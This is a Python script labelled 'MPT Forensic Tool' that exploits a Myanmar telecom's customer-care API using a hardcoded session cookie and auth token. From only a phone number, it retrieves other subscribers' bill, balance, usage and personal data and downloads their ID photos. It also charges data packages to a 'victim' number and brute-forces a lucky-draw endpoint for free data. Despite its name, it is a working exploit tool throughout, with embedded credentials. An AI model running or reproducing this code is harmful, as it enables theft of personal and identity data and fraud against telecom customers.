"""

__author__ = TwizzyIndy
__name___  = MPT Forensic Tool
__date__   = 2019/9

"""

import base64
import json
import os
import random
import time

import requests


def requestCustCodewithPhoneNumber(phoneNumber):
    custCode = ""

    try:
        response = requests.get(
            url="https://mcare.mpt.com.mm/api/services/subscriber/v1/indentify/{number}".format(number=phoneNumber),
            params=
            {
                "DNT": "1",
                "securitycode": "3264d46e14115d7fa9d8ebb393d7b6f0",
                "local": "2",
                "authtoken": "d38e5b196cf6a0a709a5b7ece22213e6",
                "Accept": "*/*",
                "timestamp": str(time.time_ns()),
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/json; charset=UTF-8",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36",
                "Sec-Fetch-Site": "same-origin",
                "Referer": "https://mcare.mpt.com.mm/",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9,my;q=0.8",
                "Cookie": "laravel_session=ZUbDeax2DrN2jWCas9qRnUcUs3ljpgGKj5yJcZcc; phone=95942xxxxxxx; auth-token=a%3A3%3A%7Bs%3A5%3A%22phone%22%3Bs%3A12%3A%229595942xxxxxxx%22%3Bs%3A8%3A%22x_msisdn%22%3Bs%3A16%3A%2283l7TeWd6hYpPmMv%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%22d38e5b196cf6a0a709a5b7ece22213e6%22%3B%7D; token=d38e5b196cf6a0a709a5b7ece22213e6",
            }, )

        if response.status_code is not 200:
            print("\n\nan error occured")
            return custCode

        jsReply = json.loads(response.content)

        # print("\nsubsId  : {subsid}".format(subsid=jsReply['subsId']))
        # print("\ncustCode: {custcode}".format(custcode=jsReply['custCode']))
        # print("\nacctNbr: {acctnbr}".format(acctnbr=jsReply['acctNbr']))

        custCode = jsReply['custCode']
        return custCode


    except requests.exceptions.RequestException:
        print('HTTP Request failed')
        return custCode

    return custCode


"""
bill info request
"""


def requestBillInfoWithAccountNbr(accountNbr):
    try:
        response = requests.get(
            url="https://mcare.mpt.com.mm/api/services/account/v1/code/{accntNbr}".format(accntNbr=accountNbr),
            params=
            {
                "DNT": "1",
                "securitycode": "3264d46e14115d7fa9d8ebb393d7b6f0",
                "local": "2",
                "authtoken": "d38e5b196cf6a0a709a5b7ece22213e6",
                "Accept": "*/*",
                "timestamp": str(time.time_ns()),
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/json; charset=UTF-8",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36",
                "Sec-Fetch-Site": "same-origin",
                "Referer": "https://mcare.mpt.com.mm/",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9,my;q=0.8",
                "Cookie": "laravel_session=ZUbDeax2DrN2jWCas9qRnUcUs3ljpgGKj5yJcZcc; phone=95942xxxxxxx; auth-token=a%3A3%3A%7Bs%3A5%3A%22phone%22%3Bs%3A12%3A%229595942xxxxxxx%22%3Bs%3A8%3A%22x_msisdn%22%3Bs%3A16%3A%2283l7TeWd6hYpPmMv%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%22d38e5b196cf6a0a709a5b7ece22213e6%22%3B%7D; token=d38e5b196cf6a0a709a5b7ece22213e6",
            }, )

        # print('Response HTTP Status Code: {status_code}'.format(
        # status_code=response.status_code))
        if response.status_code is not 200:
            print("\n\nan error occured")
            return ""

        # print('Response HTTP Response Body: {content}'.format(
        # content=response.content))

        jsReply = json.loads(response.content)
        print(jsReply)

    except requests.exceptions.RequestException:
        print('\nConnect fail due to some network error ..')

    return ""


"""

request user info using nbr

"""


def requestUserInfo(custCode):
    # Request
    # GET https://mcare.mpt.com.mm/api/services/customer/v1/code/2093563

    try:
        response = requests.get(
            url="https://mcare.mpt.com.mm/api/services/customer/v1/code/{custcode}".format(custcode=custCode),
            headers={
                "X-Requested-With": "XMLHttpRequest",
                "securitycode": "3264d46e14115d7fa9d8ebb393d7b6f0",
                "Accept-Encoding": "gzip, deflate, br",
                "timestamp": str(time.time_ns()),
                "Content-Type": "application/json; charset=UTF-8",
                "authtoken": "d38e5b196cf6a0a709a5b7ece22213e6",
                "Sec-Fetch-Site": "same-origin",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36",
                "Sec-Fetch-Mode": "cors",
                "Cookie": "laravel_session=ZUbDeax2DrN2jWCas9qRnUcUs3ljpgGKj5yJcZcc; phone=95942xxxxxxx; auth-token=a%3A3%3A%7Bs%3A5%3A%22phone%22%3Bs%3A12%3A%229595942xxxxxxx%22%3Bs%3A8%3A%22x_msisdn%22%3Bs%3A16%3A%2283l7TeWd6hYpPmMv%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%22d38e5b196cf6a0a709a5b7ece22213e6%22%3B%7D; token=d38e5b196cf6a0a709a5b7ece22213e6",
                "local": "2",
                "Referer": "https://mcare.mpt.com.mm/",
                "DNT": "1",
                "Accept-Language": "en-US,en;q=0.9,my;q=0.8",
                "Accept": "*/*",
            },
        )

        if response.status_code is not 200:
            print("\n\nan error occured")
            return ""

        jsReply = json.loads(response.content)
        print(jsReply)
        return ""

    except requests.exceptions.RequestException:
        print('HTTP Request failed')
    return ""


"""

request account balance list

"""


def requestAccountBalanceList(custCode):
    try:
        response = requests.get(
            url="https://mcare.mpt.com.mm/api/services/account/v1/balance/code/{custcode}?lang=2".format(
                custcode=custCode),
            headers={
                "X-Requested-With": "XMLHttpRequest",
                "securitycode": "3264d46e14115d7fa9d8ebb393d7b6f0",
                "Accept-Encoding": "gzip, deflate, br",
                "timestamp": str(time.time_ns()),
                "Content-Type": "application/json; charset=UTF-8",
                "authtoken": "d38e5b196cf6a0a709a5b7ece22213e6",
                "Sec-Fetch-Site": "same-origin",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36",
                "Sec-Fetch-Mode": "cors",
                "Cookie": "laravel_session=ZUbDeax2DrN2jWCas9qRnUcUs3ljpgGKj5yJcZcc; phone=9595942xxxxxxx; auth-token=a%3A3%3A%7Bs%3A5%3A%22phone%22%3Bs%3A12%3A%229595942xxxxxxx%22%3Bs%3A8%3A%22x_msisdn%22%3Bs%3A16%3A%2283l7TeWd6hYpPmMv%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%22d38e5b196cf6a0a709a5b7ece22213e6%22%3B%7D; token=d38e5b196cf6a0a709a5b7ece22213e6",
                "local": "2",
                "Referer": "https://mcare.mpt.com.mm/",
                "DNT": "1",
                "Accept-Language": "en-US,en;q=0.9,my;q=0.8",
                "Accept": "*/*",
            },
        )
        # print('Response HTTP Status Code: {status_code}'.format(
        # status_code=response.status_code))
        # print('Response HTTP Response Body: {content}'.format(
        # content=response.content))
        if response.status_code is not 200:
            print("\n\nan error occured")
            return ""

        jsReply = json.loads(response.content)
        print(jsReply)
        return ""

    except requests.exceptions.RequestException:
        print('HTTP Request failed')
    return ""


"""

get data-usage on a day with phone number

"""


def requestDataUsageOnAdayWithPhoneNumber(phoneNumber, nYear, nMonth, nDay):
    phoneNumber = "95" + phoneNumber

    try:
        response = requests.get(
            url="https://mcare.mpt.com.mm/api/services/subscriber/v1/cdr/usage/msisdn/{phone}?year={_year}&month={monthNumber}&day={dayNumber}&lang=2&type=1&postpaid=F".format(
                phone=phoneNumber, _year=nYear, monthNumber=nMonth, dayNumber=nDay),
            headers={
                "X-Requested-With": "XMLHttpRequest",
                "securitycode": "3264d46e14115d7fa9d8ebb393d7b6f0",
                "Accept-Encoding": "gzip, deflate, br",
                "timestamp": str(time.time_ns()),
                "Content-Type": "application/json; charset=UTF-8",
                "authtoken": "d38e5b196cf6a0a709a5b7ece22213e6",
                "Sec-Fetch-Site": "same-origin",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36",
                "Sec-Fetch-Mode": "cors",
                "Cookie": "laravel_session=ZUbDeax2DrN2jWCas9qRnUcUs3ljpgGKj5yJcZcc; phone=9595942xxxxxxx; auth-token=a%3A3%3A%7Bs%3A5%3A%22phone%22%3Bs%3A12%3A%229595942xxxxxxx%22%3Bs%3A8%3A%22x_msisdn%22%3Bs%3A16%3A%2283l7TeWd6hYpPmMv%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%22d38e5b196cf6a0a709a5b7ece22213e6%22%3B%7D; token=d38e5b196cf6a0a709a5b7ece22213e6",
                "local": "2",
                "Referer": "https://mcare.mpt.com.mm/",
                "DNT": "1",
                "Accept-Language": "en-US,en;q=0.9,my;q=0.8",
                "Accept": "*/*",
            },
        )

        if response.status_code is not 200:
            print("\n\nan error occured")
            return ""

        jsReply = json.loads(response.content)
        print('')
        print('')
        print(jsReply)
        print('')
        print('')

        return ""

    except requests.exceptions.RequestException:
        print('HTTP Request failed')
    return ""


"""
get user id's photos

"""


def requestUserIdPhotosWithCusCode(cusCode):
    try:
        response = requests.get(
            url="https://mcare.mpt.com.mm/api/services/customer/v1/certification/imagefiles/{custcode}".format(
                custcode=cusCode),
            headers={
                "X-Requested-With": "XMLHttpRequest",
                "securitycode": "3264d46e14115d7fa9d8ebb393d7b6f0",
                "Accept-Encoding": "gzip, deflate, br",
                "timestamp": str(time.time_ns()),
                "Content-Type": "application/json; charset=UTF-8",
                "authtoken": "d38e5b196cf6a0a709a5b7ece22213e6",
                "Sec-Fetch-Site": "same-origin",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36",
                "Sec-Fetch-Mode": "cors",
                "Cookie": "laravel_session=ZUbDeax2DrN2jWCas9qRnUcUs3ljpgGKj5yJcZcc; phone=9595942xxxxxxx; auth-token=a%3A3%3A%7Bs%3A5%3A%22phone%22%3Bs%3A12%3A%229595942xxxxxxx%22%3Bs%3A8%3A%22x_msisdn%22%3Bs%3A16%3A%2283l7TeWd6hYpPmMv%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%22d38e5b196cf6a0a709a5b7ece22213e6%22%3B%7D; token=d38e5b196cf6a0a709a5b7ece22213e6",
                "local": "2",
                "Referer": "https://mcare.mpt.com.mm/",
                "DNT": "1",
                "Accept-Language": "en-US,en;q=0.9,my;q=0.8",
                "Accept": "*/*",
            },
        )

        if response.status_code is not 200:
            print("\n\nan error occured")
            return ""

        jsReply = json.loads(response.content)

        # if jsReply['imageList'][0]['image']
        strImg1 = jsReply['imageList'][0]['image']

        strImg1Bin = base64.decodebytes(bytes(strImg1, encoding='utf-8'))
        strImg1FileName = jsReply['imageList'][0]['imageName']

        with open(strImg1FileName, 'wb') as fileImg1:
            fileImg1.write(strImg1Bin)

        if jsReply['imageList'][1]:
            strImg2 = jsReply['imageList'][1]['image']
            strImg2Bin = base64.decodebytes(bytes(strImg2, encoding='utf-8'))
            strImg2FileName = jsReply['imageList'][1]['imageName']
            with open(strImg2FileName, 'wb') as fileImg2:
                fileImg2.write(strImg2Bin)

        print('\n\nfiles saved\n\n')

        return ""

    except requests.exceptions.RequestException:
        print('HTTP Request failed')
    return ""


"""

purchase data package for given phone number with a victim phone number

"""


def purchasePackageUsingPhoneNumber(targetPhoneNum, victimPhoneNum):
    targetPhoneNum = "95" + targetPhoneNum
    victimPhoneNum = "95" + victimPhoneNum

    try:

        response = requests.post(
            url="https://mcare.mpt.com.mm/api/services/subscriber/v1/purchase/msisdn/{targetph}".format(
                targetph=targetPhoneNum),
            json={
                "amount": "699",
                "iPoint": "ALL",
                "msisdn": str(targetPhoneNum),
                "offerIds": [1250],
                "paymentMethod": "ACCOUNT",
                "paymentMsisdn": str(victimPhoneNum)
            },
            headers={
                "X-Requested-With": "XMLHttpRequest",
                "securitycode": "3264d46e14115d7fa9d8ebb393d7b6f0",
                "Accept-Encoding": "gzip, deflate, br",
                "timestamp": str(time.time_ns()),
                "Content-Type": "application/json; charset=UTF-8",
                "authtoken": "d38e5b196cf6a0a709a5b7ece22213e6",
                "Sec-Fetch-Site": "same-origin",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36",
                "Sec-Fetch-Mode": "cors",
                "Cookie": "laravel_session=ZUbDeax2DrN2jWCas9qRnUcUs3ljpgGKj5yJcZcc; phone=9595942xxxxxxx; auth-token=a%3A3%3A%7Bs%3A5%3A%22phone%22%3Bs%3A12%3A%229595942xxxxxxx%22%3Bs%3A8%3A%22x_msisdn%22%3Bs%3A16%3A%2283l7TeWd6hYpPmMv%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%22d38e5b196cf6a0a709a5b7ece22213e6%22%3B%7D; token=d38e5b196cf6a0a709a5b7ece22213e6",
                "local": "2",
                "Referer": "https://mcare.mpt.com.mm/",
                "DNT": "1",
                "Accept-Language": "en-US,en;q=0.9,my;q=0.8",
                "Accept": "*/*",
            },
        )

        if response.status_code is not 200:
            print(response.content)
            print("\n\nan error occured")
            return ""

        jsReply = json.loads(response.content)
        print(jsReply)
        return ""

    except requests.exceptions.RequestException:
        print('HTTP Post failed')
    return ""


"""

get luckydraw

Patched on September 24, 2019

"""


def postLuckdrawUsingPhoneNumber(phNumber, magicChar):
    gotPackage = 0

    phNumber = magicChar + "95" + phNumber

    try:

        response = requests.post(
            url="https://mcare.mpt.com.mm/api/services/luckdraw/v1/play/{targetph}".format(targetph=phNumber),
            headers={
                "X-Requested-With": "XMLHttpRequest",
                "securitycode": "3264d46e14115d7fa9d8ebb393d7b6f0",
                "Accept-Encoding": "gzip, deflate, br",
                "timestamp": str(time.time_ns()),
                "Content-Type": "application/json; charset=UTF-8",
                "authtoken": "d38e5b196cf6a0a709a5b7ece22213e6",
                "Sec-Fetch-Site": "same-origin",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36",
                "Sec-Fetch-Mode": "cors",
                "Cookie": "laravel_session=ZUbDeax2DrN2jWCas9qRnUcUs3ljpgGKj5yJcZcc; phone=9595942xxxxxxx; auth-token=a%3A3%3A%7Bs%3A5%3A%22phone%22%3Bs%3A12%3A%229595942xxxxxxx%22%3Bs%3A8%3A%22x_msisdn%22%3Bs%3A16%3A%2283l7TeWd6hYpPmMv%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%22d38e5b196cf6a0a709a5b7ece22213e6%22%3B%7D; token=d38e5b196cf6a0a709a5b7ece22213e6",
                "local": "2",
                "Referer": "https://mcare.mpt.com.mm/",
                "DNT": "1",
                "Accept-Language": "en-US,en;q=0.9,my;q=0.8",
                "Accept": "*/*",
            },
        )

        if response.status_code is not 200:
            print("\n\nan error occured")
            print(response.content)
            return 0

        jsReply = json.loads(response.content)

        retCode = jsReply['retCode']
        if str(retCode) is "4":
            return 0

        # print("\nReward Name : {reward}".format(reward=jsReply["rewardName"]))

        reward = jsReply["rewardName"]

        if reward is not None:
            voiceOrOther = reward.split('_')[0]
            if str(voiceOrOther) is "Voice Prize":
                return 0
            elif str(voiceOrOther) is "Airtime Prize":
                print("rewardName : {rew}".format(rew=jsReply["rewardName"]))
                return 0

            datapack = reward.split('_')[1]
            mbOrGb = str(datapack)[-2:]
            dataValue = int(str(datapack).partition(mbOrGb)[0])

            if str(mbOrGb) is "GB":
                dataValue = dataValue * 1000

            gotPackage = int(dataValue)
            return gotPackage

        return gotPackage

    except requests.exceptions.RequestException:
        print('HTTP Post failed')
    return gotPackage


"""

"""

ALLOWED_CHARACTERS = "abcdefghijklmnopqrstuvwxyz"
NUMBER_OF_CHARACTERS = len(ALLOWED_CHARACTERS)


def characterToIndex(char):
    return ALLOWED_CHARACTERS.index(char)


def indexToCharacter(index):
    if NUMBER_OF_CHARACTERS <= index:
        raise ValueError("Index out of range.")
    else:
        return ALLOWED_CHARACTERS[index]


def nextChar(string):
    """ Get next sequence of characters.
    Treats characters as numbers (0-255). Function tries to increment
    character at the first position. If it fails, new character is
    added to the back of the list.
    It's basically a number with base = 256.
    :param string: A list of characters (can be empty).
    :type string: list
    :return: Next list of characters in the sequence
    :rettype: list
    """
    if len(string) <= 0:
        string.append(indexToCharacter(0))
    else:
        string[0] = indexToCharacter((characterToIndex(string[0]) + 1) % NUMBER_OF_CHARACTERS)
        if characterToIndex(string[0]) is 0:
            return list(string[0]) + next(string[1:])
    return string


def main():
    os.system('clear')
    print('\n\n')
    print('================================')
    print('MPT Forensic Tool')
    print('TwizzyIndy 9/2019')
    print('================================')

    print('')
    print('1 . Get Bill Info')
    print('2 . Get Account Balance List')
    print('3 . Get Data Usage on-a-day')
    print('4 . Get User Info')
    print('5 . Get User ID Photos')
    print('6 . Balance Tranfer ( in process )')
    print('7 . Data Transfer')
    print('8 . Luckydraw Bruteforce (Patched on September 24, 2019)')
    print('')

    menuchoice = input('Enter a number u wish to continue .. : ')

    if menuchoice is "1":
        phnumber = input('enter phone number : ')

        accountNbr = requestCustCodewithPhoneNumber(phnumber)
        requestBillInfoWithAccountNbr(accountNbr)

    elif menuchoice == "2":
        phnumber = input('enter phone number : ')

        custCode = requestCustCodewithPhoneNumber(phnumber)
        requestAccountBalanceList(custCode)

    elif menuchoice == "3":

        phnumber = input('enter phone number : ')
        theDay = input("enter the day u want (e.g: 30.12.2009): ")
        lstTheDay = theDay.split('.')

        nDay = lstTheDay[0]
        nMonth = lstTheDay[1]
        nYear = lstTheDay[2]

        requestDataUsageOnAdayWithPhoneNumber(phnumber, nYear, nMonth, nDay)


    elif menuchoice == "4":
        phnumber = input('enter phone number : ')

        custCode = requestCustCodewithPhoneNumber(phnumber)
        requestUserInfo(custCode)

    elif menuchoice == "5":
        phnumber = input('enter phone number : ')

        custCode = requestCustCodewithPhoneNumber(phnumber)
        requestUserIdPhotosWithCusCode(custCode)

    elif menuchoice == "6":
        print('\n\nnot implemented yet\n\n')
        return

    elif menuchoice == "7":
        target_ph = input("enter the phone number u wish to be get data package : ")
        victim_ph = input("enter the victim number u targeted : ")

        purchasePackageUsingPhoneNumber(target_ph, victim_ph)
    elif menuchoice == "8":

        target_ph = input("enter the phone number u wished to be get luckdraw : ")
        target_data = input("enter the target data usage u wished (e.g: 100MB, 500MB, 1GB, 5GB, 10GB ): ")

        # parse input data
        mbOrGb = target_data[-2:]
        limitData = int(str(target_data).partition(mbOrGb)[0])

        # if GB,
        if str(mbOrGb) == "GB":
            limitData = int(str(target_data).partition(mbOrGb)[0]) * 1000

        gotData = 0

        # a
        sequence = list()
        sequence2 = list()
        sequence3 = list()

        i = 0

        while i is not 26:
            sequence = nextChar(sequence)

            print("\nmagic : " + str(sequence[0]))

            x = postLuckdrawUsingPhoneNumber(target_ph, str(sequence[0]))
            if x is not 0:
                gotData += x
                print("got " + str(gotData) + " MB")

            if gotData >= limitData:
                print("data limited reached!\n")
                return
            i += 1

        i = 0

        # aa
        sequence = list()
        while i is not 26:
            sequence = random.choice(ALLOWED_CHARACTERS)
            sequence2 = random.choice(ALLOWED_CHARACTERS)

            print('\nmagic : ' + str(sequence[0]) + str(sequence2[0]))
            x = postLuckdrawUsingPhoneNumber(target_ph, str(sequence[0]) + str(sequence2[0]))
            if x is not 0:
                gotData += x
                print("got " + str(gotData) + " MB")

            if gotData >= limitData:
                print("data limited reached!\n")
                return
            i += 1

        i = 0

        sequence = list()
        sequence2 = list()
        sequence3 = list()

        # aaa
        while i is not 26:
            sequence = random.choice(ALLOWED_CHARACTERS)
            sequence2 = random.choice(ALLOWED_CHARACTERS)
            sequence3 = random.choice(ALLOWED_CHARACTERS)

            print('\nmagic : ' + str(sequence[0]) + str(sequence2[0]) + str(sequence3[0]))
            x = postLuckdrawUsingPhoneNumber(target_ph, str(sequence[0]) + str(sequence2[0]) + str(sequence3[0]))
            if x is not 0:
                gotData += x
                print("got " + str(gotData) + " MB")

            if gotData >= limitData:
                print("data limited reached!\n")
                return

            i += 1

        # abb
        i = 0

        sequence = list()
        sequence2 = list()
        sequence3 = list()
        while i is not 26:
            sequence = random.choice(ALLOWED_CHARACTERS)
            sequence2 = random.choice(ALLOWED_CHARACTERS)
            sequence3 = random.choice(ALLOWED_CHARACTERS)

            print('\nmagic : ' + str(sequence[0]) + str(sequence2[0]) + str(sequence3[0]))
            x = postLuckdrawUsingPhoneNumber(target_ph, str(sequence[0]) + str(sequence2[0]) + str(sequence3[0]))
            if x is not 0:
                gotData += x
                print("got " + str(gotData) + " MB")

            if gotData >= limitData:
                print("data limited reached!\n")
                return

            i += 1

        # bab
        i = 0

        sequence = list()
        sequence2 = list()
        sequence3 = list()
        while i is not 26:
            sequence = random.choice(ALLOWED_CHARACTERS)
            sequence2 = random.choice(ALLOWED_CHARACTERS)
            sequence3 = random.choice(ALLOWED_CHARACTERS)

            print('\nmagic : ' + str(sequence[0]) + str(sequence2[0]) + str(sequence3[0]))
            x = postLuckdrawUsingPhoneNumber(target_ph, str(sequence[0]) + str(sequence2[0]) + str(sequence3[0]))
            if x is not 0:
                gotData += x
                print("got " + str(gotData) + " MB")

            if gotData >= limitData:
                print("data limited reached!\n")
                return

            i += 1

        # bba
        i = 0

        sequence = list()
        sequence2 = list()
        sequence3 = list()
        while i is not 26:
            sequence = random.choice(ALLOWED_CHARACTERS)
            sequence2 = random.choice(ALLOWED_CHARACTERS)
            sequence3 = random.choice(ALLOWED_CHARACTERS)

            print('\nmagic : ' + str(sequence[0]) + str(sequence2[0]) + str(sequence3[0]))
            x = postLuckdrawUsingPhoneNumber(target_ph, str(sequence[0]) + str(sequence2[0]) + str(sequence3[0]))
            if x is not 0:
                gotData += x
                print("got " + str(gotData) + " MB")

            if gotData >= limitData:
                print("data limited reached!\n")
                return
            i += 1

        # aaaa
        i = 0
        sequence = list()
        sequence2 = list()
        sequence3 = list()
        sequence4 = list()

        while i is not 26:
            sequence = random.choice(ALLOWED_CHARACTERS)
            sequence2 = random.choice(ALLOWED_CHARACTERS)
            sequence3 = random.choice(ALLOWED_CHARACTERS)
            sequence4 = random.choice(ALLOWED_CHARACTERS)

            print('\nmagic : ' + str(sequence[0]) + str(sequence2[0]) + str(sequence3[0]) + str(sequence4[0]))
            x = postLuckdrawUsingPhoneNumber(target_ph, str(sequence[0]) + str(sequence2[0]) + str(sequence3[0]) + str(
                sequence4[0]))
            if x is not 0:
                gotData += x
                print("got " + str(gotData) + " MB")

            if gotData >= limitData:
                print("data limited reached!\n")
                return
            i += 1

        # abbb
        i = 0
        sequence = list()
        sequence2 = list()
        sequence3 = list()
        sequence4 = list()

        while i is not 26:
            sequence = random.choice(ALLOWED_CHARACTERS)
            sequence2 = random.choice(ALLOWED_CHARACTERS)
            sequence3 = random.choice(ALLOWED_CHARACTERS)
            sequence4 = random.choice(ALLOWED_CHARACTERS)

            print('\nmagic : ' + str(sequence[0]) + str(sequence2[0]) + str(sequence3[0]) + str(sequence4[0]))
            x = postLuckdrawUsingPhoneNumber(target_ph, str(sequence[0]) + str(sequence2[0]) + str(sequence3[0]) + str(
                sequence4[0]))
            if x is not 0:
                gotData += x
                print("got " + str(gotData) + " MB")

            if gotData >= limitData:
                print("data limited reached!\n")
                return

            i += 1

        # babb
        i = 0
        sequence = list()
        sequence2 = list()
        sequence3 = list()
        sequence4 = list()

        while i is not 26:
            sequence = random.choice(ALLOWED_CHARACTERS)
            sequence2 = random.choice(ALLOWED_CHARACTERS)
            sequence3 = random.choice(ALLOWED_CHARACTERS)
            sequence4 = random.choice(ALLOWED_CHARACTERS)

            print('\nmagic : ' + str(sequence[0]) + str(sequence2[0]) + str(sequence3[0]) + str(sequence4[0]))
            x = postLuckdrawUsingPhoneNumber(target_ph, str(sequence[0]) + str(sequence2[0]) + str(sequence3[0]) + str(
                sequence4[0]))
            if x is not 0:
                gotData += x
                print("got " + str(gotData) + " MB")

            if gotData >= limitData:
                print("data limited reached!\n")
                return

            i += 1

        # bbab
        i = 0
        sequence = list()
        sequence2 = list()
        sequence3 = list()
        sequence4 = list()

        while i is not 26:
            sequence = random.choice(ALLOWED_CHARACTERS)
            sequence2 = random.choice(ALLOWED_CHARACTERS)
            sequence3 = random.choice(ALLOWED_CHARACTERS)
            sequence4 = random.choice(ALLOWED_CHARACTERS)

            print('\nmagic : ' + str(sequence[0]) + str(sequence2[0]) + str(sequence3[0]) + str(sequence4[0]))
            x = postLuckdrawUsingPhoneNumber(target_ph, str(sequence[0]) + str(sequence2[0]) + str(sequence3[0]) + str(
                sequence4[0]))
            if x is not 0:
                gotData += x
                print("got " + str(gotData) + " MB")

            if gotData >= limitData:
                print("data limited reached!\n")
                return
            i += 1

        # bbba
        i = 0
        sequence = list()
        sequence2 = list()
        sequence3 = list()
        sequence4 = list()

        while i is not 26:
            sequence = random.choice(ALLOWED_CHARACTERS)
            sequence2 = random.choice(ALLOWED_CHARACTERS)
            sequence3 = random.choice(ALLOWED_CHARACTERS)
            sequence4 = random.choice(ALLOWED_CHARACTERS)

            print('\nmagic : ' + str(sequence[0]) + str(sequence2[0]) + str(sequence3[0]) + str(sequence4[0]))
            x = postLuckdrawUsingPhoneNumber(target_ph, str(sequence[0]) + str(sequence2[0]) + str(sequence3[0]) + str(
                sequence4[0]))
            if x is not 0:
                gotData += x
                print("got " + str(gotData) + " MB")

            if gotData >= limitData:
                print("data limited reached!\n")
                return
            i += 1

    return


if __name__ == "__main__":
    main()
